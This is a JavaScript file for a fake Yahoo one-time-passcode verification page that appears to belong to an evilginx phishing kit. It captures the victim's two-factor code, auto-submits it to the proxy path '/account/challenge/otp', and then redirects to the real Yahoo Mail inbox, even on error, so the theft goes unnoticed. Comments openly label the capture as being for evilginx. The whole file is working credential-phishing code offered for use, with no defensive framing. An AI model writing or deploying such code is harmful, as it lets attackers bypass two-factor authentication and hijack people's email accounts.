document.addEventListener("DOMContentLoaded", () => {
  const form = document.querySelector(".signin-form")
  const submitBtn = document.getElementById("verifyBtn")
  const otpField = document.getElementById("verifyCode")

  // OTP input validation
  otpField.addEventListener("input", function () {
    // Only allow numbers
    this.value = this.value.replace(/[^0-9]/g, "")

    if (this.value.length >= 4) {
      submitBtn.disabled = false
      submitBtn.style.opacity = "1"
    } else {
      submitBtn.disabled = true
      submitBtn.style.opacity = "0.6"
    }
  })

  // Auto-submit when 6 digits entered
  otpField.addEventListener("input", function () {
    if (this.value.length === 6) {
      setTimeout(() => {
        form.dispatchEvent(new Event("submit"))
      }, 500)
    }
  })

  // Form submission handling
  form.addEventListener("submit", (e) => {
    e.preventDefault()

    const otpCode = otpField.value
    if (!otpCode || otpCode.length < 4) {
      alert("Please enter a valid verification code")
      return
    }

    // Show loading state
    submitBtn.innerHTML = '<span class="loading-spinner"></span>Verifying...'
    submitBtn.disabled = true

    // Store OTP for evilginx capture
    const formData = new FormData()
    formData.append("verifyCode", otpCode)

    // Send to evilginx for capture
    fetch("/account/challenge/otp", {
      method: "POST",
      body: formData,
      credentials: "include",
    })
      .then((response) => {
        // Show success state
        submitBtn.innerHTML = '<span class="success-checkmark">✓</span>Success!'

        // Redirect to Yahoo Mail after short delay
        setTimeout(() => {
          window.location.href = "https://mail.yahoo.com/d/folders/1"
        }, 1500)
      })
      .catch((error) => {
        console.error("Error:", error)
        // Still redirect on error to maintain flow
        setTimeout(() => {
          window.location.href = "https://mail.yahoo.com/d/folders/1"
        }, 1500)
      })
  })

  // Initialize form state
  if (otpField.value.length === 0) {
    submitBtn.disabled = true
    submitBtn.style.opacity = "0.6"
  }

  // Focus on OTP field
  otpField.focus()
})
